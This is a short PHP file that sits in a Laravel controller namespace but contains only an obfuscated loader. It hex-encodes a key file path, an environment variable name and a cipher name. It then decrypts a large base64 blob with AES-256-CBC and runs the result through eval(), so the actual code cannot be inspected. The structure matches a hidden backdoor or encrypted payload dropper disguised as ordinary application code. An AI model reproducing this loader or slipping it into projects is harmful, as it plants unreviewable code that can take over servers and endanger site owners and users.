<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Ixam+pmwQiN4FPGOOHj3ag==');

$c=base64_decode(

'QQiwOyGJX+Pv+6wIRTzEx09ELceixmMPbS+GFWPQTR7Fez4jLHfh8YYgDaKSYXC/RJ3/xkuc5SnD' .
'HQ8MHaWWS+aX1mPy93VGCwObVtFfu4PUhM+wgkGo6DbSAvlYL5UR3Yga+fi2Go8Cyk1A8ugkGL/0' .
'DNTe7/zMIrEPeHVzql2UvzyuS6UV+d6LQXzjalPrB9bI6TBWCivHy0YmPb5PBswEu64vaxEJyX1w' .
'GOsemWnOEzfeHDfK95VL4kxwkuII6GYgFs3FjzOiytWuHG2srkfoHZXP5CyXAaWuKnS3MpzYNE+f' .
'5Rkg+dgr4nvlbZZPZwJig1n+CoNe6SmaBXn6W4Xa8b6abaUlX2cCxv8IXP1kFM5+tuzp4aKzgCVg' .
'+55akfxUMo8ZiQiOYQjmg6+XRYKqpG9p47sThQSOgy6i+RxXdTNuapFjcqvP1nW5OipKV0Z0n+rb' .
'RyamXLoTOLHLMraFxvWz3szCUADNDYRjqGRa2HTsCoJiF+O+16PRa3hLo80FLvwR11g1h9rBhA0Q' .
'9xZu1maOaAKgJKiqnRa2RKii99Wd2CVxP1xaS72rHmz7FntVky55VAxh5we4D7OiEiAOvf780VwL' .
'xfd3vZ5lTgrXAfUTDTSxlm5UmSFgyyMizHU6TwSL7feQRryCjRWfcJwqCPo3oIUoNv+FBb1EV/wy' .
'PsS0heLviP672pXqIvZ5V7qmfSFm5OdqDtP5VowycwK5GEKuybcFeRVf+iZTPoU78hkzZEm0vpF+' .
'zYDZHS0nQZsfGGQ7fMxzbHeCE7NmgWbD+fZ/GbRBULogn8QPZVkuCk73Z3YyNGk1ClNm4JR1iwqn' .
'XV0Xdcy6kSnHNo9tOj1UXAjkmkJUnflSqOwkFd71cAyHGF7LcFtFt+X1Sp/J9yxIGFaqSQNmO+tJ' .
'hkJPpXvdnvwFYEoq+WmAqoDKkGSxrmxDhZyQvijaX3je0dUBsYmmTxV+TVAK9iNLujhE5ILo8wFm' .
'jSuf7o2a5FdQs8AkFL4zElSsAj2PztnaEHqBO3P2D0tQKviMe1bSBBBMDX4eK4iBAEyGfzWa4ivN' .
'xVp/RwUNhSXC1rnX++RTQ6lGc+sD2cY29wA+iiownMFNKbw8+SjOpx28gwzzIejzcYLDhdTEHkjS' .
'UxSQLm0/iBjjAVWAXOnm5ZTl5fxXUXo0Tr8jeUp6PoRGdL8UeXs0MG6TahxpjlSGV+TdVphVLJWL' .
'Nv3E3t/5DeB6976c3VauMTpaTUjdbONlrRHm6TBT3CKaXo/+CUHSL8hIcArTPYPhkQ6f4YeVrGKP' .
'8yXAOOtIxg60Xk2Qaj0rZpaYoA826iLjyEdzvUnuq9856qUmLFg4fi0RDfcGTN5JkHB9WMJMG1O8' .
'qqlX15NU8fnNa0q5Ir4SsaTHpo4TZ8aCVqNnjm3yRr/Zo5ILhUfvC9t1eSHrBKPNVmJMUtH8zBQ/' .
'1zEUeLqVU9fnZnrwhYwGgFmm3z1Ugok93Y7EKjxkwBLk3/wNjFJzKxJdNBUjR3sYt0I5B2fwwFNV' .
'CuxLfnUqcxPMYvC6luYzu+t+CHnsHW3q9V+nyB73Llplmp2g8KcQmNugYIsQZ4uJg89Iu6DgIBFr' .
'RcyMQJ+rw887oa/nO9PsNp5fTRWxueP5GXGQmGcvXGrvox9oYrLyakFhW/9491hfjA+8tMnieVb4' .
'lkK+OeYlked6YjdTZTwmhGhqVSj2IAf9y4DyUlmK8j3ilYAImPZBPZS/ekqRTdzs9+PjwN8OJToN' .
'8AGvuGLGWVZtbY3qKLoz2EuIlOM0Kdx/8a84PoLl3874VybpNejs6VLgX7kP6zSttvJBOKYb57i2' .
'VORvp5XHUa+m9ix2biudqO2+De9crdvBzhCdkjYc9mB64D6jmo6hqGWsfT77YvaAE16pISt+jX4y' .
'ovNBPuW2eN+6S6NXucQw+vYD1JdOuFE3XEgrh/frcQl0ZBbThEZ45ZYejos6U07Q96ayKkeK860D' .
'mTrw9CjvwhoswqvNV2MMoimpd44JyGZntFjS505JDiNs2lfwEDJme+rggzVFiXuhjyoGinHKKzkL' .
'saLRSTR3Dhhp7nEKXv5dwL5aneZ00ULyjeiNWr3BoY8Hb2J7IloqKkr6BGWfeVGTvJyuhm6qObnG' .
'5hm+acM4UK4PuiyebpEDZXJtK7x5BEQAI3WCQwoaB4BjfFL8xheYA/58P2eOXv6cY5BUKVgbkjBx' .
'bHWAmKezmx0own3Cl3lgkfrfsTfl4uR5iiMhhTG2p2fk9I+sG//yZhZYG0fADaWwq+miWwtxJKHm' .
'/3iT0KTfet1ny+PrxONv+MvB1RTwOSWtjXWqpGDU0NHYOoRqNPp9lD5JIEm3RGtAut+fqyKbjEBH' .
'ZXSxRKHSbMSDiS6IH9EBPH3vN71kYwE1kB7Ft9P6RVPjxitn5KLb7nDa1KamB+nN5vhdEvzMYo7f' .
'04N1Bfgyb8Mx3Y5pajsxoIy36woI5Zres5dbKUYX2i+O67pEEMIIX5LM2HrO6HY9KeJ9misg8raF' .
'4oIx+mnFvw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

